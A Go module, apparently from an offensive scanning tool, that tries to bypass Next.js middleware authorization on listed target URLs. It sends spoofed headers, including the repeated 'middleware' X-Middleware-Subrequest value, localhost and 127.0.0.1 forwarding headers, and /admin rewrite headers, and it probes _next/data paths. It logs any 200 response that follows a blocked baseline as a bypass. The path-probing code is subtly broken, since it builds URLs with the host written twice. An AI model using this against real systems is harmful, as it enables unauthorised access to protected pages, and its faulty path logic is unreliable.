package nextjsbypass

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/CyberShuriken/rfuf/internal/findings/internal/iohelp"
)

type bypassHeader struct {
	Name  string
	Value string
}

var bypassHeaders = []bypassHeader{
	{"X-Middleware-Subrequest", "middleware:middleware:middleware:middleware:middleware"},
	{"X-Forwarded-Host", "localhost"},
	{"X-Forwarded-For", "127.0.0.1"},
	{"X-Real-IP", "127.0.0.1"},
	{"X-Original-URL", "/admin"},
	{"X-Rewrite-URL", "/admin"},
}

// Run attempts to bypass Next.js middleware on high-interest URLs.
func Run(workDir string) error {
	urls, err := iohelp.ReadLines(workDir + "/high_interest_urls.txt")
	if err != nil || len(urls) == 0 {
		return iohelp.WriteLines(workDir+"/nextjs_bypass_findings.txt", []string{})
	}

	var findings []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, urlStr := range urls {
		// Baseline
		baselineCode := getStatusCode(client, urlStr, nil)

		// 1. Header-based bypasses
		for _, bh := range bypassHeaders {
			headers := map[string]string{bh.Name: bh.Value}
			bypassCode := getStatusCode(client, urlStr, headers)

			if baselineCode != 200 && bypassCode == 200 {
				findings = append(findings, fmt.Sprintf("[BYPASS] %s using %s: baseline=%d bypass=%d", urlStr, bh.Name, baselineCode, bypassCode))
			}
		}

		// 2. Path-based bypasses (Next.js specific)
		// Example: /admin -> /_next/data/development/admin.json (if applicable)
		if strings.Contains(urlStr, "http") {
			parsed, err := url.Parse(urlStr)
			if err == nil {
				path := parsed.Path
				if path != "" && path != "/" {
					// Attempt a few common Next.js path bypasses
					bypasses := []string{
						fmt.Sprintf("%s/_next/data/production%s.json", parsed.Host, path),
						fmt.Sprintf("%s/_next/data/development%s.json", parsed.Host, path),
					}
					for _, bPath := range bypasses {
						// This is a simplified attempt; in reality, we'd need to construct the full URL.
						testURL := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, bPath)
						if getStatusCode(client, testURL, nil) == 200 && baselineCode != 200 {
							findings = append(findings, fmt.Sprintf("[BYPASS] %s via path manipulation: %s", urlStr, testURL))
						}
					}
				}
			}
		}
	}

	return iohelp.WriteLines(workDir+"/nextjs_bypass_findings.txt", findings)
}

func getStatusCode(client *http.Client, urlStr string, headers map[string]string) int {
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return 0
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	return resp.StatusCode
}
